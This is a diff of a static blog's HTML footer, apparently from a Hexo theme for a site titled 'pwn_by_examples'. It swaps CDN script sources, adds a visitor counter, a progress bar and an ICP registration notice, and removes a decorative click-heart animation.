+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
     
   </div>
 
 
-    
+  
   <!-- 备案信息 -->
-  <div>
-    <a href="http://beian.miit.gov.cn/" target="_blank"
-       rel="nofollow noopener">浙ICP备19033044号</a>
-    
-
-
+  <div class="beian">
+    <span>
+      <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+        浙ICP备19033044号
+      </a>
+    </span>
     
   </div>
+
+
+  
 </footer>
 
-<!-- SCRIPTS -->
-<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
-<script  src="https://cdn.staticfile.org/popper.js/1.16.1/umd/popper.min.js" ></script>
-<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
-<script  src="https://cdn.staticfile.org/mdbootstrap/4.13.0/js/mdb.min.js" ></script>
-<script  src="/js/main.js" ></script>
 
-
-  <script  src="/js/lazyload.js" ></script>
-
-
-
+  <!-- SCRIPTS -->
   
-  <script  src="https://cdn.staticfile.org/tocbot/4.10.0/tocbot.min.js" ></script>
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
   <script>
-    $(document).ready(function () {
-      var navHeight = $('#navbar').height();
-      var toc = $('#toc');
-      var boardCtn = $('#board-ctn');
-      var boardTop = boardCtn.offset().top;
-      var tocLimMax = 2 * boardTop + boardCtn.height();
-
-      $(window).scroll(function () {
-        var tocLimMin = $('#toc-start').offset().top - navHeight;
-        var scroH = document.body.scrollTop + document.documentElement.scrollTop;
-
-        if (tocLimMin <= scroH && scroH <= tocLimMax) {
-          toc.css({
-            'display': 'block',
-            'position': 'fixed',
-            'top': navHeight,
-          });
-        } else if (scroH <= tocLimMin) {
-          toc.css({
-            'position': '',
-            'top': '',
-          });
-        } else if (scroH > tocLimMax) {
-          toc.css('display', 'none');
-        }
-      });
-      tocbot.init({
-        tocSelector: '#tocbot',
-        contentSelector: '.post-content',
-        headingSelector: 'h1,h2,h3,h4,h5,h6',
-        linkClass: 'tocbot-link',
-        activeLinkClass: 'tocbot-active-link',
-        listClass: 'tocbot-list',
-        isCollapsedClass: 'tocbot-is-collapsed',
-        collapsibleClass: 'tocbot-is-collapsible',
-        scrollSmooth: true,
-        headingsOffset: -boardTop
-      });
-      if ($('.toc-list-item').length > 0) {
-        $('#toc > p').css('visibility', 'visible');
-      }
-      var offset = boardCtn.css('margin-right')
-      $('#toc-ctn').css({
-        'right': offset
-      })
-    });
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
   </script>
 
 
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
 
 
 
-  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
-  <script  src="/js/clipboard-use.js" ></script>
+  
 
 
 
-  <script defer src="https://cdn.staticfile.org/smoothscroll/1.4.10/SmoothScroll.min.js" ></script>
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
 
 
 
@@ -627,141 +660,48 @@ sh.interactive()</code></pre>
 
 
 
-<!-- Plugins -->
-
-
-
-  <script  src="https://cdn.staticfile.org/prettify/188.0.0/prettify.min.js" ></script>
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
   <script>
-    $(document).ready(function () {
-      $('pre').addClass('prettyprint  linenums');
-      prettyPrint();
-    })
-  </script>
-
-
-
-  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
-  <script>
-    var typed = new Typed('#subtitle', {
-      strings: [
-        '  ',
-        "pwn_by_examples&nbsp;",
-      ],
-      cursorChar: "_",
-      typeSpeed: 70,
-      loop: false,
-    });
-    typed.stop();
-    $(document).ready(function () {
-      $(".typed-cursor").addClass("h2");
-      typed.start();
-    });
-  </script>
-
-
-
-  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
-  <script>
-    anchors.options = {
-      placement: "right",
-      visible: "hover",
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
       
-    };
-    var el = "h1,h2,h3,h4,h5,h6".split(",");
-    var res = [];
-    for (item of el) {
-      res.push(".markdown-body > " + item)
-    }
-    anchors.add(res.join(", "))
+      typing(title)
+      
+    })(window, document);
   </script>
 
 
 
   <script  src="/js/local-search.js" ></script>
   <script>
-    var path = "/local-search.xml";
-    var inputArea = document.querySelector("#local-search-input");
-    inputArea.onclick = function () {
-      getSearchFile(path);
-      this.onclick = null
-    }
-  </script>
-
-
-
-  <script defer src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
-  <script>
-    $("#post img:not(.no-zoom img, img[no-zoom])").each(
-      function () {
-        var element = document.createElement("a");
-        $(element).attr("data-fancybox", "images");
-        $(element).attr("href", $(this).attr("src"));
-        $(this).wrap(element);
-      }
-    );
+    (function () {
+      var path = "/local-search.xml";
+      $('#local-search-input').on('click', function() {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      });
+      $('#modalSearch').on('shown.bs.modal', function() {
+        $('#local-search-input').focus();
+      });
+    })()
   </script>
 
 
 
 
 
-  
-  
-    <script>
-      !function (e, t, a) {
-        function r() {
-          for (var e = 0; e < s.length; e++) s[e].alpha <= 0 ? (t.body.removeChild(s[e].el), s.splice(e, 1)) : (s[e].y--, s[e].scale += .004, s[e].alpha -= .013, s[e].el.style.cssText = "left:" + s[e].x + "px;top:" + s[e].y + "px;opacity:" + s[e].alpha + ";transform:scale(" + s[e].scale + "," + s[e].scale + ") rotate(45deg);background:" + s[e].color + ";z-index:99999");
-          requestAnimationFrame(r)
-        }
-
-        function n() {
-          var t = "function" == typeof e.onclick && e.onclick;
-          e.onclick = function (e) {
-            t && t(), o(e)
-          }
-        }
-
-        function o(e) {
-          var a = t.createElement("div");
-          a.className = "heart", s.push({
-            el: a,
-            x: e.clientX - 5,
-            y: e.clientY - 5,
-            scale: 1,
-            alpha: 1,
-            color: c()
-          }), t.body.appendChild(a)
-        }
-
-        function i(e) {
-          var a = t.createElement("style");
-          a.type = "text/css";
-          try {
-            a.appendChild(t.createTextNode(e))
-          } catch (t) {
-            a.styleSheet.cssText = e
-          }
-          t.getElementsByTagName("head")[0].appendChild(a)
-        }
-
-        function c() {
-          return "rgb(" + ~~(255 * Math.random()) + "," + ~~(255 * Math.random()) + "," + ~~(255 * Math.random()) + ")"
-        }
-
-        var s = [];
-        e.requestAnimationFrame = e.requestAnimationFrame || e.webkitRequestAnimationFrame || e.mozRequestAnimationFrame || e.oRequestAnimationFrame || e.msRequestAnimationFrame || function (e) {
-          setTimeout(e, 1e3 / 60)
-        }, i(".heart{width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);}.heart:after,.heart:before{content: '';width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: fixed;}.heart:after{top: -5px;}.heart:before{left: -5px;}"), n(), r()
-      }(window, document);
-    </script>
-  
 
 
 
 
 
 
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
 
 
 </body>
